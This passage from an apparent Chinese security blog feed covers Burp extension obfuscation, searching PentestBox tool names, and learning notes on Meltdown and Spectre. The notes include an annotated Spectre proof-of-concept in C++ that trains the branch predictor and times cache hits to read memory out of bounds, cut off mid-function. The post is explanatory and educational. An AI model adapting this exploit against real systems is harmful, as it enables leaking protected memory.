class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jar</span> <span class="attr">in</span>=<span class="string">"xxe-helper 0.1.jar"</span> <span class="attr">out</span>=<span class="string">"xxe-helper-obf.jar"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">input</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">classpath</span> <span class="attr">basedir</span>=<span class="string">"library-jars"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jar</span> <span class="attr">name</span>=<span class="string">"*.jar"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">classpath</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">keep-names</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">class</span> <span class="attr">template</span>=<span class="string">"class burp.*"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">field</span> <span class="attr">template</span>=<span class="string">"public *"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">method</span> <span class="attr">template</span>=<span class="string">"public *(*)"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">class</span> <span class="attr">template</span>=<span class="string">"interface  burp.*"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">keep-names</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"log-file"</span> <span class="attr">value</span>=<span class="string">"log.xml"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改<code>RunAllatori.bat</code>代码为：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -Xms128m -Xmx512m -jar allatori\allatori.jar config.xml</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><p>修改<code>Clean.bat</code>代码为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">del log.xml</span><br><span class="line">del *obf.jar</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>最后运行<code>RunAllitori.bat</code></p><p><img src="/articles/2018/obfuscation-of-burp-extension-code/RunAllatori.png" alt="运行RunAllitori.bat"></p><p>大家可以发现红框标出的是混淆器提示我们有些类没有找到，这些类时插件包含的jar所依赖的jar，大家可以根据提示的缺的包名，用上面说过的搜jar方法，把它们下载并引入进来。不过我们不引入它们也是可以混淆的，但混淆的强度会弱一些。</p><p>不懂编写<code>config.xml</code>的小伙伴，可以去阅读一下<a href="http://www.allatori.com/doc.html" target="_blank" rel="noopener">官方文档</a>。</p><p>下面我们对比一下混淆前后的效果！</p><p><img src="/articles/2018/obfuscation-of-burp-extension-code/before_obfuscated_code.png" alt="插件混淆前代码反编译"></p><p><img src="/articles/2018/obfuscation-of-burp-extension-code/after_obfuscated_code.png" alt="插件混淆后代码反编译"></p><p>经过测试插件混淆后，可以运行。</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>混淆和编码有大关系，比如设计包名时，应该将我们插件的核心代码单独放一个包里，不要一股脑都放在burp。这样的话最后不好写混淆规则。对于方法和属性得访问属性（public,protected,private）,要深思熟虑。这样不但程序更规范，写混淆规则也会简单些。</p><p>如果插件引用的jar比较多，使用ProGuard来混淆是比较麻烦的。因为依赖的外部jar也会依赖其他jar,你需要将它们都引入才行！我自己目前也没有好的解决方法。例子中的插件没有引用外部jar，所以混淆容易一些。allori不存在这个问题，只引入依赖jar就行。</p><p>最后大家可以在我研究的基础上去，看看如何设置使得混淆效果更加好。如有新发现，欢迎留言交流。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/cr330326/p/5534915.html" target="_blank" rel="noopener">ProGuard代码混淆技术详解</a></p><p><a href="https://www.jianshu.com/p/b471db6a01af" target="_blank" rel="noopener">ProGuard 最全混淆规则说明</a></p><p><a href="http://blog.csdn.net/huningjun/article/details/52609788" target="_blank" rel="noopener">ProGuard工具 jar包混淆问题总结</a></p><p><a href="http://www.coin163.com/it/x5604474166355522533/java-allatori" target="_blank" rel="noopener">allatori混淆技术总结</a></p><p><a href="http://www.allatori.com/doc.html" target="_blank" rel="noopener">Allatori Java Obfuscator - Documentation</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> burp suite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>填坑:PentestBox之工具名称搜索</title>
      <link href="/articles/2018/pentestbox-search-tools/"/>
      <url>/articles/2018/pentestbox-search-tools/</url>
      
        <content type="html"><![CDATA[<p>PentestBox是我在Windows上很喜欢的一款移动渗透工具，我一直把它当做我的移动kali。所以我将很多自己常用的Python脚本和其他常用软件引入到PentestBox中。这导致现在PentestBox下工具很多，根本无法记得它们的名称。所以在使用的时候，还得去PentestBox目录查看它们的名称，这很浪费时间！这个问题我也是想了很多方法，也去了各个论坛提问。</p><h2 id="方法一：list"><a href="#方法一：list" class="headerlink" title="方法一：list"></a>方法一：list</h2><p>list命令是PentestBox自带的命令，它可以列取某个模块下所有的工具。缺点是无法列取我们自定义引入的工具。不过Cra5h大佬在这个命令的基础上，修复了这个缺陷。大家可以去看一下他的文章，不失为一种解决思路。修复之后list可以列区我们引入的工具名称。</p><p>但list还是有硬伤，它是通列取模块下所有工具来找到目标工具名称。所以你得知道工具在那个模块下，同时该模块下如果工具很多，你还得从多工具名称中找到目标工具。</p><h2 id="方法二：开启自动补全"><a href="#方法二：开启自动补全" class="headerlink" title="方法二：开启自动补全"></a>方法二：开启自动补全</h2><p>使用kali的小伙伴对此应该深有体会：很多安全工具记不住它的名称，但通过TAB键能轻松补全。</p><p>PentestBox使用clink来实现自动补全，默认不启用，所以我们需要去setting中启用它。</p><p><img src="/articles/2018/pentestbox-search-tools/setting.png" alt="图1-启动clink"></p><p>可能有的童鞋启用时会报以下错误</p><p><img src="/articles/2018/pentestbox-search-tools/error.png" alt="图2-报错"></p><p>只要根据提示去<code>http://mridgers.github.io/clink/</code>下载<code>clink</code>,然后解压到<br><code>D:\PentestBox\vendor\conemu-maximus5\ConEmu\clink</code>路径下，再次启动就不会报错了。</p><p>开启之后，我们就可以</p><ul><li>输入burp,一个TAB就自动补全为burpsuite</li><li>输入wire,一个TAB就自动补全为wireshark</li><li>……</li></ul><p>当然自动补全还是有一点硬伤，那就是如果你输入前几个字母是错误的，那么自动补全是无法补全出你想要的工具名称。所以我们继续填坑吧！</p><h2 id="方法三：py大法"><a href="#方法三：py大法" class="headerlink" title="方法三：py大法"></a>方法三：py大法</h2><p>一直觉得搜索才能彻底解决这个问题。我认真观察了一下文件<code>D:\PentestBox\config\aliases</code>里保存有PentestBox自带工具名称，文件<code>D:\PentestBox\bin\customtools\customaliases</code>里保存有我们自定义引入的工具名称。所以可以写一个py脚本从这两个文件的内容中搜索出目标工具名称。</p><p>我自己写了一个小工具，可以把它引入到PentestBox中来实现PentestBox的搜索功能。代码虽然不是很多，但还是占点行数，所以我上传到了github。有兴趣的小伙伴可以下载玩玩。</p><h4 id="github地址：https-github-com-c0ny1-pentestbox-search-tools"><a href="#github地址：https-github-com-c0ny1-pentestbox-search-tools" class="headerlink" title="github地址：https://github.com/c0ny1/pentestbox-search-tools"></a>github地址：<a href="https://github.com/c0ny1/pentestbox-search-tools" target="_blank" rel="noopener">https://github.com/c0ny1/pentestbox-search-tools</a></h4><p>工具实现了：</p><ul><li>全词搜索</li><li>模糊搜索</li><li>通配符搜索</li><li>是否区分大小写</li></ul><p><img src="/articles/2018/pentestbox-search-tools/pentestbox-search-tools.gif" alt="图3-pentestbox-search-tools演示"></p><h2 id="方法四：通过编写lua脚本扩展clink实现搜索"><a href="#方法四：通过编写lua脚本扩展clink实现搜索" class="headerlink" title="方法四：通过编写lua脚本扩展clink实现搜索"></a>方法四：通过编写lua脚本扩展clink实现搜索</h2><p>方法三其实已经算是解决问题了，但是我还是觉得不完美。原谅我对优美如此执着。方法四是我目前觉得更完美的设想方案，不知道技术上是否能实现（我认为是可行的，哈哈）。如果能实现，我甚至建议PentestBox作者能在下一版本考虑一下集成这样的功能。</p><p>先说三个发现</p><ul><li>第一个发现，启用了clink之后，如果你按两次TAB键，clink是可以列取出PentestBox下所有工具名称（包括自带的和自定义的）。这说明clink是可以获取到PentestBox的所有工具名称。</li><li>第二个发现，clink可以通ctr+r/ctr+s来搜索历史执行的命令，自更加坚定clink是可以实现搜索的。</li><li>第三个发现，我看了clink的官方网站，说是可以通过编写lua脚本扩展clink。</li></ul><p>由这三个发现我认为通过写lua脚本来实现clink的搜索功能，在技术上应该可行！无奈clink官方没有相关api文档，我暂时无法实现。</p><p>最后欢迎有想法的小伙伴留言，交流 <strong>如何实现PentestBox搜索工具名称功能？</strong></p>]]></content>
      
      
      <categories>
          
          <category> 填坑日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PentestBox </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Meltdown和Spectre漏洞学习笔记</title>
      <link href="/articles/2018/learning-notes-of-meltdown-and-spectre/"/>
      <url>/articles/2018/learning-notes-of-meltdown-and-spectre/</url>
      
        <content type="html"><![CDATA[<p>最近Meltdown和Spectre两个漏洞在各大安全媒体刷屏，堪称年初大戏。本来想好好研究一下这两个漏洞的原理，无奈业界各位大牛各种分析，深感自己写的不如他们通俗易懂。故这篇文章，大部分内容不是自己的研究成果，而是阅读各位大牛漏洞分析文章的一个总结笔记。有些段是原封不动的，若有侵权嫌疑，请联系我。</p><h2 id="0x01漏洞原理"><a href="#0x01漏洞原理" class="headerlink" title="0x01漏洞原理"></a>0x01漏洞原理</h2><h4 id="1-1CPU缓存验证缺陷"><a href="#1-1CPU缓存验证缺陷" class="headerlink" title="1.1CPU缓存验证缺陷"></a>1.1CPU缓存验证缺陷</h4><p>分支预测和乱序执行，是一种CPU优化技术，CPU会执行一些可能在将来会执行的任务。当分支指令发出之后，无相关优化技术的处理器，在未收到正确的反馈信息之前，是不会做任何处理；而具有优化技术能力的新型处理器，可以预测即将执行的指令，会预先处理一些指令所需的数据，例如将下一条指令所需要访问的内存提前加载到CPU缓存中，这就避免了执行具体指令时再去读内存，从而加快了CPU的执行速度，具体流程如下所示：</p><p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/001.jpg" alt="CPU 优化执行"></p><p>指令3如果出现问题（如指令3是一个除0或者是一个非法的操作），会触发CPU的异常处理，具体情况如下</p><p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/002.jpg" alt="CPU异常指令执行"></p><p>对于具有预测执行能力的新型处理器，在实际CPU执行过程中，指令4所需的内存加载环节不依赖于指令3是否能够正常执行，而且从内存到缓存加载这个环节不会验证访问的内存是否合法有效。即使指令3出现异常，指令4无法执行，但指令4所需的内存数据已加载到CPU缓存中，这一结果导致指令4即使加载的是无权限访问的内存数据，该内存数据也会加载到CPU缓存中，因为CPU是在缓存到寄存器这个环节才去检测地址是否合法，而CPU分支预测仅仅是完成内存到CPU缓存的加载，实际指令4并没有被真正的执行，所以他的非法访问是不会触发异常的。</p><p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/003.jpg" alt="CPU数据访问权限和地址合法性检查"></p><p>如上图所示CPU缓存的这个过程对于用户是不可访问的，只有将具体的数据放到CPU的寄存器中用户才可操作，同时用户态程序也没有权限访问内核内存中的数据，因此CPU采用这种逻辑是没有问题的，但是如果有方法可以让我们得到CPU缓存中的数据，那么这种逻辑就存在缺陷。</p><h4 id="1-2边信道攻击缓存"><a href="#1-2边信道攻击缓存" class="headerlink" title="1.2边信道攻击缓存"></a>1.2边信道攻击缓存</h4><p>CPU缓存通常在较小和较快的内部存储中缓存常用数据，从而隐藏慢速内存访问的延迟，缓存侧信道攻击正是利用CPU缓存与系统内存的读取的时间差异，从而变相猜测出CPU缓存中的数据，结合前边的缓存缺陷部分内容，产生如下的结果：</p><p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/004.png" alt="漏洞原理图"></p><p><em>注：简单来说，就是CPU缓存中的数据，在用户态和内核态都是无法正常访问的，除非当CPU缓存中的数据保存到寄存器中时，会被正常的读取；除此之外，是可以通过边信道的方式读取CPU的缓存的。<br>基于如上介绍的漏洞原理信息，通过CPU缓存验证缺陷，并利用边信道攻击技术可猜测CPU缓存中的数据，继而访问主机的完整内存数据，造成用户敏感信息泄露。</em></p><h4 id="1-3通俗理解"><a href="#1-3通俗理解" class="headerlink" title="1.3通俗理解"></a>1.3通俗理解</h4><p>生活实例：新生入学报道（为简化问题，假设今天只有你一个人去学校报道，并且学校工作人员都是250）</p><p>开学去学校报道，三个步骤（三条CPU指令）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1）凭借录取通知书去领学号</span><br><span class="line">2）凭借领取到的学号去领寝室号</span><br><span class="line">3）凭借领取到的寝室号去领寝室钥匙</span><br></pre></td></tr></table></figure><p>开学了，你捡到一张录取通知书，通知书编号是1001，然后去拿着它去学校报道，报道工作处有三个工作人员甲乙丙。甲负责直接和你交互，甲拿到你的入学通知书后开始查找你的学号，然后填写表格，然后把学号给你</p><p>与此同时，工作人员乙拿到甲查到的学号后，去表格中查你对应的寝室号，等甲办完以后直接交给你。</p><p>还是与此同时，工作人员丙拿到乙查到的寝室号后开始去库房的钥匙柜架取出你的钥匙放在办公桌（同时，为了避免等会又跑一趟，它把这栋楼这一层的钥匙盒直接拿到办公室了，等会就不用再去库房奔波了），等乙办完以后就交给你。</p><p>但是，这个时候，甲发现你身份有问题，这不是你的录取通知书，不能给你办理入学手续，不能把学号给你。于是你被打回。</p><p>可是：乙已经提前帮你把对应学号的寝室号取到了（只是还没给你），丙也已经提前帮你把对应寝室的钥匙给你拿到了（只是还没给你）</p><p>好，你被拒绝办理入学了，因为你是假冒的</p><p>实际上，你已经是在校生了，不是大一新生，刚才你是故意去假冒大一新生去报道。<br>这个时候，你去丙的办公室借钥匙。往常丙都是说你等一下，我去给你拿，然后会等差不多五分钟，丙给你拿来钥匙。但今天不同的是，今天没有等那么久，而是直接就把钥匙取出来了给你，全程不超过10秒钟。</p><p>于是，你明白了，一定是我刚才假冒去甲办理入学的时候，丙把钥匙盒取过来的，于是你意识到：我开始捡到的1001号的录取通知书新生住在我们这栋楼这一层。</p><p>于是，你如法炮制，伪造1002,1003,1999···号录取通知书去报道，然后知道了他们每个人住在哪一栋那一层。</p><h2 id="0x02漏洞复现"><a href="#0x02漏洞复现" class="headerlink" title="0x02漏洞复现"></a>0x02漏洞复现</h2><p>漏洞论文后给了一个POC，我们用他来复现。</p><p>它的github地址为：<code>https://github.com/Eugnis/spectre-attack</code></p><h4 id="2-1poc代码注释"><a href="#2-1poc代码注释" class="headerlink" title="2.1poc代码注释"></a>2.1poc代码注释</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    modify by:CSZQ</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/*配置*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __DEBUG 0 <span class="comment">// 调试模式开关，会打开额外输出</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __TRYTIMES 50 <span class="comment">// 每个字符尝试读取次数</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*测试读取的数据*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __MAGICWORDS   <span class="meta-string">"1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890"</span>     </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __MAGICWORDSCOUNT (sizeof(__MAGICWORDS) - 1) <span class="comment">// 测试数据长度</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    cache 命中阀值，是一个经验值，不成功9.9可能这里不对，默认值 50 ，可以通过 -t 传参修改</span></span><br><span class="line"><span class="comment">    该数值与内存质量、CPU多项参数有关，是一个经验值，下面给出一些基于本帅移动端的 CPU Intel I7-4700MQ 给出的参数取值</span></span><br><span class="line"><span class="comment">    取值大致范围：16 - 176</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHE_HIT_THRESHOLD (50)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/*头文件*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;intrin.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> optimize(<span class="meta-string">"gt"</span>,on)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/*全局变量*/</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> array1_size = <span class="number">16</span>; <span class="comment">// 排除 ASCII 码表前 16 个字符</span></span><br><span class="line"><span class="keyword">uint8_t</span> array1[<span class="number">160</span>]      = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span> &#125;; <span class="comment">// 一个字典</span></span><br><span class="line"><span class="keyword">uint8_t</span> array2[<span class="number">256</span> * <span class="number">512</span>]; <span class="comment">// 256 对应 ASCII 码表</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *secret = __MAGICWORDS; <span class="comment">// 测试读取的数据</span></span><br><span class="line"><span class="keyword">int</span> iThreshold = CACHE_HIT_THRESHOLD; <span class="comment">// 读取时间阀值</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">/*使用 temp 全局变量阻止编译器优化 victim_function()*/</span></span><br><span class="line"><span class="keyword">uint8_t</span> temp = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">victim_function</span><span class="params">(<span class="keyword">size_t</span> x)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        x 取值 0 - 15 时 获取 arrary2 的 1 - 16 分组 &amp; temp 后赋值给 temp</span></span><br><span class="line"><span class="comment">        temp 一直为 0</span></span><br><span class="line"><span class="comment">        发生 evil 分支预测：</span></span><br><span class="line"><span class="comment">        array1[x] 在 5 次分支预测时加载的值就是当前需要读取的虚拟地址</span></span><br><span class="line"><span class="comment">        array2[array1[x] * 512] 在 5 次分支预测期间读取的是 标准ASCII 0 - 127 * 512 所在地址的 array2 数组内容</span></span><br><span class="line"><span class="comment">        其他分支预测：</span></span><br><span class="line"><span class="comment">        array1[x] cache 中的是根据尝试次数获取到的正常 array1 数组标准值</span></span><br><span class="line"><span class="comment">        array2[array1[x] * 512] 在cache中缓存的是 ASCII 码表 1 - 16 号字符</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (x &lt; array1_size) &#123;</span><br><span class="line">        temp &amp;= array2[array1[x] * <span class="number">512</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">readMemoryByte</span><span class="params">(<span class="keyword">size_t</span> malicious_x, <span class="keyword">uint8_t</span> value[<span class="number">2</span>], <span class="keyword">int</span> score[<span class="number">2</span>])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">int</span> results[<span class="number">256</span>];                                          <span class="comment">// 对应 ASCII 码表</span></span><br><span class="line">    <span class="keyword">int</span> tries, i, j, k, mix_i;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> junk = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> training_x, x;</span><br><span class="line">    <span class="keyword">register</span> <span class="keyword">uint64_t</span> time1, time2;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">uint8_t</span> *addr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">        results[i] = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*每个字符多次尝试获取以增加成功率*/</span></span><br><span class="line">    <span class="keyword">for</span> (tries = __TRYTIMES; tries &gt; <span class="number">0</span>; tries--) &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*清空 array2 的每 512 字节首地址 cache*/</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">            _mm_clflush(&amp;array2[i * <span class="number">512</span>]); <span class="comment">// _mm_clflush：Invalidate and flush the cache line that contains p from all levels of the cache hierarchy</span></span><br><span class="line"> </span><br><span class="line">        training_x = tries % array1_size;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*训练 CPU 缓存需要的数据*/</span></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">29</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">            _mm_clflush(&amp;array1_size); <span class="comment">// 清空array1_size的缓存</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*100 次内存取值用作延时，确保 cache 页全部换出*/</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">volatile</span> <span class="keyword">int</span> z = <span class="number">0</span>; z &lt; <span class="number">100</span>; z++) &#123;&#125;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                在这一步:</span></span><br><span class="line"><span class="comment">                j % 6 =  0 则 x = 0xFFFF0000</span></span><br><span class="line"><span class="comment">                j % 6 != 0 则 x = 0x00000000</span></span><br><span class="line"><span class="comment">                Avoid jumps in case those tip off the branch predictor</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            x = ((j % <span class="number">6</span>) - <span class="number">1</span>) &amp; ~<span class="number">0xFFFF</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                到这里:</span></span><br><span class="line"><span class="comment">                j % 6 =  0 则 x = 0xFFFFFFFF</span></span><br><span class="line"><span class="comment">                j % 6 != 0 则 x = 0x00000000</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            x = (x | (x &gt;&gt; <span class="number">16</span>));</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                最后:</span></span><br><span class="line"><span class="comment">                j % 6 =  0 则 x = malicious_x</span></span><br><span class="line"><span class="comment">                j % 6 != 0 则 x = training_x</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            x = training_x ^ (x &amp; (malicious_x ^ training_x));</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                调用触发 cache 代码</span></span><br><span class="line"><span class="comment">                共计触发 5 次，j = 24、18、12、6、0时，都会触发分支预测</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            victim_function(x);</span><br><span class="line">        